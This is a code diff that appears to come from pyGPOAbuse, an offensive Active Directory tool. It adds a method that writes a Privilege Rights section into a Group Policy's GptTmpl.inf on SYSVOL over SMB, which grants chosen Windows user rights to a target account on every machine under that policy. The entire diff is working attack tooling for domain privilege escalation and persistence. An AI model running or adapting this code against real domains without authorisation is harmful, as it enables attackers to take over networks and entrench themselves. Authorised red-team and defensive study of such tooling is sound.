@@ -3,6 +3,7 @@ import logging
 import re
 from pygpoabuse.scheduledtask import ScheduledTask
 from pygpoabuse.ldap import Ldap
+from pygpoabuse.userrights import UserRights
 
 
 class GPO:
@@ -214,3 +215,110 @@ class GPO:
             return False
         self._smb_session.closeFile(tid, fid)
         return st.get_name()
+
+    def update_user_rights(self, domain, gpo_id, username, sid, rights, force=False):
+        """Add user rights to a GPO
+
+        Args:
+            domain: Domain name
+            gpo_id: ID of the GPO to modify
+            username: Username to assign rights to
+            sid: SID of the user
+            rights: Comma-separated list of rights to assign
+            force: Force update if GptTmpl.inf already exists
+
+        Returns:
+            bool: True if successful, False otherwise
+        """
+        try:
+            tid = self._smb_session.connectTree("SYSVOL")
+            logging.debug("Connected to SYSVOL")
+        except:
+            logging.error("Unable to connect to SYSVOL share", exc_info=True)
+            return False
+
+        path = domain + "/Policies/{" + gpo_id + "}/"
+
+        try:
+            self._smb_session.listPath("SYSVOL", path)
+            logging.debug("GPO id {} exists".format(gpo_id))
+        except:
+            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
+            return False
+
+        # User rights can only be applied to Machine policy
+        root_path = "Machine"
+        secedit_path = "{}/Microsoft/Windows NT/SecEdit".format(root_path)
+
+        if not self._check_or_create(path, secedit_path):
+            return False
+
+        user_rights = UserRights(username, sid, rights)
+        is_valid, invalid_rights = user_rights.validate_rights()
+        
+        if not is_valid:
+            logging.error("Invalid rights specified: {}".format(", ".join(invalid_rights)))
+            return False
+
+        inf_path = path + "{}/Microsoft/Windows NT/SecEdit/GptTmpl.inf".format(root_path)
+
+        try:
+            fid = self._smb_session.openFile(tid, inf_path)
+            inf_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
+            
+            # Check if the file already contains user rights
+            if "[Privilege Rights]" in inf_content and not force:
+                logging.error("The GPO already includes user rights in GptTmpl.inf.")
+                logging.error("Use -f to override the existing settings")
+                self._smb_session.closeFile(tid, fid)
+                return False
+            
+            # Close the existing file before proceeding
+            self._smb_session.closeFile(tid, fid)
+            
+            # If force is true, or there's no user rights section, create/update the file
+            if force or "[Privilege Rights]" not in inf_content:
+                if "[Privilege Rights]" not in inf_content:
+                    # No rights section exists, append it
+                    logging.debug("No user rights section exists in the file, adding it")
+                    
+                    # Remove the existing section markers if they exist
+                    sections = ["[Unicode]", "[Version]", "[Privilege Rights]"]
+                    clean_content = inf_content
+                    for section in sections:
+                        clean_content = clean_content.replace(section, "")
+                    
+                    # Generate new content with the user rights
+                    new_content = user_rights.generate_inf_file_content()
+                    
+                    # Add any other content that might have been in the file
+                    if clean_content.strip():
+                        new_content += clean_content
+                else:
+                    # Rights section exists, but we're forcing the update
+                    logging.debug("User rights section exists, forcing update")
+                    new_content = user_rights.generate_inf_file_content()
+                
+                # Open the file for writing
+                fid = self._smb_session.createFile(tid, inf_path)
+                self._smb_session.writeFile(tid, fid, new_content)
+                self._smb_session.closeFile(tid, fid)
+                return True
+        
+        except Exception as e:
+            # File does not exist, create it
+            logging.debug("GptTmpl.inf does not exist. Creating it...")
+            try:
+                fid = self._smb_session.createFile(tid, inf_path)
+                logging.debug("GptTmpl.inf created")
+                
+                # Generate and write the inf file content
+                new_content = user_rights.generate_inf_file_content()
+                self._smb_session.writeFile(tid, fid, new_content)
+                self._smb_session.closeFile(tid, fid)
+                return True
+            except:
+                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
+                return False
+        
+        return False
